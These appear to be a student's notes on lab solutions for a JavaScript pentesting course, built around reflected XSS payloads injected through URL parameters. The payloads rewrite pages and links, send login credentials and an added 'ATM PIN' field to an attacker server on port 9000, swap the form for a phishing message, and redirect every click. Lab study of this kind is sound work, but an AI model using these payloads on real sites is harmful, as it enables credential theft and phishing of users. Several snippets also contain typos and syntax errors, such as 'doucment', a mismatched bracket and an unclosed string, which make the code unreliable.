                    Javascript For Pentesters
                    Notes on Solutions
                    
                    
1 - Modify Html
The task is to modify a couple of page elements.
Source code of page is examined so that items to be modified can be identified in their elements eg H1, div etc
In the example the innerHtml of a h2 tag will need to be modified as well as a h1 tag
The JS script that is used to change the tags which contain the items to be changed is
Script Syntax
  <script>
    // Gets the third h2 tag
    document.getElementsByTagName("h2")[2].innerHTML = "Modified You";
    // get the first h1 tag
    doucment.getElementsByTagName("h1")[0].innerHTML = "Found You";
  </script>
On the sample page anything entered into the searchbox will be reflected back to the page 
  - This field can be used for xss injection
The script is ran through a url encoder
  - https://meyerweb.com/eric/tools/dencoder/
The script is added to the url parameter in the address bar in the browser


2 - Change All Links
The task on this occasion is to change on links on a page to point to a given url
Similar to the previous task the page reflects back what is typed in the box making it vulnerable to a XSS attack
Script Syntax
<script>
  // Gives all the a href links
  var links = document.getElementsByTagName("a");
  
  // Iterates through the links but there are many different ways of doing this
  for(i = 0; i < links.length; i++){
    // Change the url at each link in the array
    links[i].href = "url";
    links[i}.innerHTML = "Link Modified";
  }
</script>
Again run the script through the urlencoder and add as a paremeter to url in the address bar


3 - Hijack Form Submit
First step is to inspect the source code -- ctrl-u
There is only a single form on the page
There are 2 input fields a username\email field and a password field
The first step will be to add an event handler which ensures that the exploit code is called when the form is submitted
Solution Syntax
  <script>
    function InterceptForm(){ 
      // There is only one form so the form will be value 0
      var username = document.forms[0].elements[0].value;
      var password = document.forms[0].elements[1].value;
      
      // Removed to show the sending to attackers server exampl
      // alert(username + ' : ' + password);
      
      new Image().src = "http://localhost:9000/?username="+username+"&password="+password;
    }
    
    document.forms[0].onsubmit = InterceptForm
  </script>
  Again the script is ran through a urlencoder and injected into the url parameter in the browser address bar
  Starting a web server to demo sending user details to an attackers server
  Starting a server can be done multiple ways but using python is the method shown here
    python -m SimpleHTTPServer 9000  -- This will start a server on port 9000


4 - Modify Form Fields
Using the same webpage as previous example
Injecting the code as a URL parameter it is reflected on to the page
The challenge is to add a new form element which will take an ATM pin number
As usual the first step is to examine the source code from the web page
There is only one form element
In order to accept PIN numbers there will have to be an input element of type text added to the form
The new element must match the look and feel of the existing elements
Solution Syntax
  <script>
    // To create an input element
    var input = document.createElement("input");
    
    // Input Attributes
    input.setAttribute("type", "text");
    input.setAttribute("class", "input-block-level");
    input.setAttribute("placeholder", "ATM PIN");
    input.setAttribute("name", "atmpin");
    
    // The newly created element will need to be added so a position in the form will be chosen
    var previous = document.forms[0].elements[0];
    
    // To insert a new element before another element such as the one named above
    document.forms[0].insertBefore(input, previous);
    
    // Ensure that the form action points to the server that we want
    document.forms[0].action = "http://localhost:9000/"
  </script>
Again the script is ran through a URL encoder and added to the URL parameter
Having a running server to test should show the pin number


5 Social Engineering
Using JS for Social Engineering Attack
Task is to replace existing form and add a please visit message
Again view the page source code
Solution Syntax
  <script>
    var input = document.createElement("h2");
    
    input.innerHTML = "Unfortunately the site is down please visit url;
    
    // In JS to remove a tag you find the parent of the tag and use it to remove the child tag
    
    // This adds the new input element
    document.forms[0].parentNode.appendChild(input);
    
    // This removes the form
    document.forms[0].parentNode.removeChild(document.forms[0]);
    
  </script>
Again the script is ran through a URL encoder and added as a parameter to url option in the address bar


6 Capture All Clicks
Capturing when a user clicks on a webpage and then redirect to a url
Solution Syntax
  <script>
    function CaughtClick(){
      // For testing
      alert("You Clicked");
      
      // add redirect url which will automaticall redirect when you click on the page
      location.href = "redirect url";
    }
    
    // To have the click handler called for every click anywhere on the page
    // will need and event listener called at the document body level
    document.body.addEventListener("Click", CaughtClick, true);
    
  </script>
Again the script is ran through a URL encoder and added as a parameter to url option in the address bar
